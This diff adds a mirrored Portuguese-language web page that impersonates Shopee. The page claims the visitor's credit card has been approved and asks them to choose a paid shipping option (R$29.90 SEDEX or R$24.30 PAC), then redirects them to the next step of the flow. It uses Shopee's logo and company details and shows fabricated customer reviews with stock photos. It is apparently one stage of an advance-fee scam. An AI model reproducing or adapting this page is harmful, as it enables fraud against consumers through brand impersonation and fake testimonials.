@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from ativo-agora.site/12/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 28 Sep 2025 18:39:02 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <title>Shopee - Método de Envio</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #F5F5F5;
+            min-height: 100vh;
+            color: #000000;
+            position: relative;
+            overflow-x: hidden;
+        }
+        /* Animated Background Elements */
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.03;
+            pointer-events: none;
+        }
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: #ee4d2d;
+        }
+        .decoration1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+        .decoration2 {
+            width: 200px;
+            height: 200px;
+            bottom: 10%;
+            left: 5%;
+            animation: float2 25s infinite ease-in-out;
+        }
+        .decoration3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 50%;
+            animation: float3 30s infinite ease-in-out;
+        }
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-30px, 30px) scale(1.1); }
+        }
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(0.9); }
+        }
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+        /* Header do Shopee */
+        .header {
+            background: #ee4d2d;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            animation: slideDown 0.6s ease-out;
+        }
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .logo-img {
+            height: 37px;
+            width: auto;
+            animation: logoAppear 0.8s ease-out;
+            margin-left: 12px;
+        }
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        /* Content Container */
+        .content-container {
+            max-width: 520px;
+            margin: 30px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 25px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            animation: scaleIn 0.6s ease-out;
+            position: relative;
+            border: 1px solid #F5F5F5;
+            text-align: center;
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        /* Title */
+        .main-title {
+            font-size: 32px;
+            font-weight: 700;
+            color: #000000;
+            line-height: 1.3;
+            margin-bottom: 20px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #7F8C8D;
+            line-height: 1.5;
+            margin-bottom: 40px;
+            animation: fadeIn 0.6s ease-out 0.2s both;
+        }
+        .subtitle strong {
+            color: #000000;
+            font-weight: 600;
+        }
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        /* Shipping Options */
+        .shipping-options {
+            margin: 30px 0;
+        }
+        .shipping-option {
+            background: #FFFFFF;
+            border: 2px solid #E8E8E8;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            animation: fadeIn 0.6s ease-out, gentleBounce 3s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+        @keyframes gentleBounce {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-3px); }
+        }
+        .shipping-option:nth-child(2) {
+            animation-delay: 1.5s;
+        }
+        .shipping-option:hover {
+            border-color: #ee4d2d;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(238, 77, 45, 0.15);
+        }
+        .shipping-option.selected {
+            border-color: #ee4d2d;
+            background: #fff5f5;
+            box-shadow: 0 8px 25px rgba(238, 77, 45, 0.2);
+        }
+        .shipping-option.selected::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: #ee4d2d;
+        }
+        .popular-badge {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: #4CAF50;
+            color: white;
+            padding: 6px 14px;
+            border-radius: 15px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            z-index: 10;
+            box-shadow: 0 2px 8px rgba(76, 175, 80, 0.3);
+        }
+        .shipping-info {
+            display: flex;
+            align-items: center;
+            flex: 1;
+        }
+        .shipping-icon {
+            width: 50px;
+            height: 50px;
+            margin-right: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            font-size: 24px;
+        }
+        .sedex-icon {
+            background: #FFF3E0;
+        }
+        .pac-icon {
+            background: #E3F2FD;
+        }
+        .shipping-details {
+            text-align: left;
+        }
+        .shipping-name {
+            font-size: 20px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 4px;
+        }
+        .shipping-time {
+            font-size: 14px;
+            color: #7F8C8D;
+            margin-bottom: 6px;
+        }
+        .shipping-features {
+            font-size: 12px;
+            color: #4CAF50;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        .estimated-delivery {
+            font-size: 12px;
+            color: #666;
+            font-style: italic;
+        }
+        .shipping-price {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+        }
+        /* Security Info */
+        .security-info {
+            background: #F0F8F0;
+            border: 1px solid #C8E6C9;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 25px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .security-icon {
+            background: #E8F5E8;
+            color: #4CAF50;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+        .security-text {
+            flex: 1;
+        }
+        .security-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 4px;
+        }
+        .security-desc {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.4;
+        }
+        /* Reviews Section */
+        .reviews-section {
+            margin: 25px 0;
+            background: #FAFAFA;
+            border-radius: 12px;
+            padding: 20px;
+        }
+        .reviews-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .review-carousel {
+            height: 140px;
+            position: relative;
+            overflow: hidden;
+        }
+        .review {
+            position: absolute;
+            width: 100%;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            text-align: center;
+            padding: 10px;
+        }
+        .review.active {
+            opacity: 1;
+        }
+        .stars {
+            color: #FFD700;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        .review-quote {
+            font-size: 14px;
+            color: #555;
+            font-style: italic;
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+        .reviewer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 13px;
+        }
+        .reviewer-photo {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #ee4d2d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 600;
+            color: white;
+            border: 1px solid #ee4d2d;
+        }
+        .reviewer-name {
+            font-weight: 600;
+            color: #333;
+        }
+        /* Footer */
+        footer {
+            padding: 40px 20px;
+            text-align: center;
+            background: #f5f5f5;
+            margin-top: 60px;
+        }
+        footer p {
+            color: #999;
+            font-size: 14px;
+            margin: 8px 0;
+            line-height: 1.6;
+            font-weight: 400;
+        }
+        .footer-company {
+            font-weight: 400;
+            color: #999;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        /* Mobile Responsive */
+        @media (max-width: 500px) {
+            .content-container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+            .main-title {
+                font-size: 26px;
+            }
+            .shipping-option {
+                padding: 15px;
+            }
+            .shipping-name {
+                font-size: 18px;
+            }
+            .shipping-price {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+    
+    <!-- Header do Shopee -->
+    <div class="header">
+        <img src="https://freelogopng.com/images/all_img/1656181621shopee-logo-white.png" alt="Shopee" class="logo-img">
+    </div>
+    
+    <div class="content-container">
+        <h1 class="main-title">Escolha o método de envio</h1>
+        <p class="subtitle">Agora basta escolher uma forma de envio do seu Cartão de Crédito <strong>APROVADO</strong></p>
+        
+        <div class="shipping-options">
+            <div class="shipping-option" data-method="sedex" data-price="29.90" onclick="selectShipping(this)">
+                <div class="popular-badge">Mais Popular</div>
+                <div class="shipping-info">
+                    <div class="shipping-icon sedex-icon">📦</div>
+                    <div class="shipping-details">
+                        <div class="shipping-name">SEDEX</div>
+                        <div class="shipping-time">1 dia útil</div>
+                        <div class="shipping-features">✓ Rastreamento incluído</div>
+                        <div class="estimated-delivery" id="sedex-delivery"></div>
+                    </div>
+                </div>
+                <div class="shipping-price">R$ 29,90</div>
+            </div>
+            
+            <div class="shipping-option" data-method="pac" data-price="24.30" onclick="selectShipping(this)">
+                <div class="shipping-info">
+                    <div class="shipping-icon pac-icon">📮</div>
+                    <div class="shipping-details">
+                        <div class="shipping-name">PAC</div>
+                        <div class="shipping-time">15-20 dias úteis</div>
+                        <div class="shipping-features">✓ Rastreamento incluído</div>
+                        <div class="estimated-delivery" id="pac-delivery"></div>
+                    </div>
+                </div>
+                <div class="shipping-price">R$ 24,30</div>
+            </div>
+        </div>
+        
+        <div class="security-info">
+            <div class="security-icon">🛡️</div>
+            <div class="security-text">
+                <div class="security-title">Entrega 100% Segura</div>
+                <div class="security-desc">Seu cartão será enviado em embalagem discreta com seguro incluído e rastreamento completo.</div>
+            </div>
+        </div>
+        
+        <div class="reviews-section">
+            <div class="reviews-title">O que nossos clientes dizem</div>
+            <div class="review-carousel">
+                <div class="review active">
+                    <div class="stars">⭐⭐⭐⭐⭐</div>
+                    <div class="review-quote">"Finalmente consegui um cartão de crédito! O cartão Shopee é incrível e o limite é muito bom!"</div>
+                    <div class="reviewer">
+                        <img src="https://images.unsplash.com/photo-1494790108755-2616b169962d?w=150&amp;h=150&amp;fit=crop&amp;crop=face" class="reviewer-photo" alt="Maria">
+                        <span class="reviewer-name">Maria Fernanda</span>
+                    </div>
+                </div>
+                <div class="review">
+                    <div class="stars">⭐⭐⭐⭐⭐</div>
+                    <div class="review-quote">"Recebi meu cartão Shopee super rápido e o limite foi bem generoso. Recomendo demais!"</div>
+                    <div class="reviewer">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&amp;h=150&amp;fit=crop&amp;crop=face" class="reviewer-photo" alt="João">
+                        <span class="reviewer-name">João Silva</span>
+                    </div>
+                </div>
+                <div class="review">
+                    <div class="stars">⭐⭐⭐⭐⭐</div>
+                    <div class="review-quote">"Processo simples e aprovação na hora. Shopee é top! Melhor cartão que já tive."</div>
+                    <div class="reviewer">
+                        <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=150&amp;h=150&amp;fit=crop&amp;crop=face" class="reviewer-photo" alt="Ana">
+                        <span class="reviewer-name">Ana Carolina</span>
+                    </div>
+                </div>
+                <div class="review">
+                    <div class="stars">⭐⭐⭐⭐⭐</div>
+                    <div class="review-quote">"Finalmente um cartão que aprova! Muito satisfeito com o cartão Shopee e o atendimento."</div>
+                    <div class="reviewer">
+                        <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=150&amp;h=150&amp;fit=crop&amp;crop=face" class="reviewer-photo" alt="Carlos">
+                        <span class="reviewer-name">Carlos Mendes</span>
+                    </div>
+                </div>
+                <div class="review">
+                    <div class="stars">⭐⭐⭐⭐⭐</div>
+                    <div class="review-quote">"Entrega rápida e cartão chegou perfeitamente. O cartão Shopee é confiável e seguro!"</div>
+                    <div class="reviewer">
+                        <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=150&amp;h=150&amp;fit=crop&amp;crop=face" class="reviewer-photo" alt="Luciana">
+                        <span class="reviewer-name">Luciana Santos</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+    
+    <footer>
+        <p class="footer-company">Shopee S/A | 35.635.824/0001-12</p>
+        <p>Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903</p>
+        <p>© 2025 - Todos os direitos reservados</p>
+    </footer>
+    
+    <script>
+        // Sistema global de dados do usuário
+        const UserData = {
+            userData: {},
+            save: function(dados) {
+                this.userData = { ...this.userData, ...dados };
+                console.log('Dados salvos:', this.userData);
+            },
+            load: function() {
+                return this.userData;
+            },
+            update: function(novosDados) {
+                this.userData = { ...this.userData, ...novosDados };
+                console.log('Dados atualizados:', this.userData);
+                return this.userData;
+            },
+            clear: function() {
+                this.userData = {};
+            }
+        };
+
+        let selectedMethod = null;
+        let currentReview = 0;
+
+        function calculateDeliveryDate(days) {
+            const today = new Date();
+            let deliveryDate = new Date(today);
+            let addedDays = 0;
+            
+            while (addedDays < days) {
+                deliveryDate.setDate(deliveryDate.getDate() + 1);
+                if (deliveryDate.getDay() !== 0 && deliveryDate.getDay() !== 6) {
+                    addedDays++;
+                }
+            }
+            
+            return deliveryDate.toLocaleDateString('pt-BR', { 
+                day: '2-digit', 
+                month: '2-digit'
+            });
+        }
+
+        function calculateDeliveryRange(minDays, maxDays) {
+            const today = new Date();
+            let minDate = new Date(today);
+            let maxDate = new Date(today);
+            let addedMinDays = 0;
+            let addedMaxDays = 0;
+            
+            while (addedMinDays < minDays) {
+                minDate.setDate(minDate.getDate() + 1);
+                if (minDate.getDay() !== 0 && minDate.getDay() !== 6) {
+                    addedMinDays++;
+                }
+            }
+            
+            while (addedMaxDays < maxDays) {
+                maxDate.setDate(maxDate.getDate() + 1);
+                if (maxDate.getDay() !== 0 && maxDate.getDay() !== 6) {
+                    addedMaxDays++;
+                }
+            }
+            
+            return `${minDate.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' })} a ${maxDate.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' })}`;
+        }
+
+        function selectShipping(element) {
+            document.querySelectorAll('.shipping-option').forEach(option => {
+                option.classList.remove('selected');
+            });
+            
+            element.classList.add('selected');
+            
+            selectedMethod = {
+                method: element.dataset.method,
+                price: element.dataset.price,
+                name: element.querySelector('.shipping-name').textContent,
+                time: element.querySelector('.shipping-time').textContent
+            };
+            
+            UserData.update({
+                etapa_atual: 'metodo_envio',
+                metodo_envio: selectedMethod,
+                envio_data: new Date().toISOString()
+            });
+            
+            console.log('Método selecionado:', selectedMethod);
+            
+            // Feedback visual
+            element.style.transform = 'scale(1.02)';
+            setTimeout(() => {
+                element.style.transform = '';
+                
+                // Redirecionamento baseado na seleção
+                if (selectedMethod.method === 'sedex') {
+                    window.location.href = '../13/index.html';
+                } else if (selectedMethod.method === 'pac') {
+                    window.location.href = '../13-1/index.html';
+                }
+            }, 300);
+        }
+
+        function nextReview() {
+            const reviews = document.querySelectorAll('.review');
+            reviews[currentReview].classList.remove('active');
+            currentReview = (currentReview + 1) % reviews.length;
+            reviews[currentReview].classList.add('active');
+        }
+
+        // Inicialização
+        document.addEventListener('DOMContentLoaded', function() {
+            // Calcula datas de entrega
+            const sedexDelivery = document.getElementById('sedex-delivery');
+            const pacDelivery = document.getElementById('pac-delivery');
+            
+            if (sedexDelivery) {
+                sedexDelivery.textContent = `Chegará até ${calculateDeliveryDate(1)}`;
+            }
+            
+            if (pacDelivery) {
+                pacDelivery.textContent = `Chegará entre ${calculateDeliveryRange(15, 20)}`;
+            }
+            
+            // Inicia carrossel de reviews
+            setInterval(nextReview, 4000);
+            
+            // Carrega dados existentes
+            const dadosUsuario = UserData.load();
+            if (dadosUsuario?.metodo_envio) {
+                const metodo = dadosUsuario.metodo_envio.method;
+                const element = document.querySelector(`[data-method="${metodo}"]`);
+                if (element) {
+                    selectShipping(element);
+                }
+            }
+        });
+    </script>
+</body>
+
+<!-- Mirrored from ativo-agora.site/12/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 28 Sep 2025 18:39:02 GMT -->
+</html>
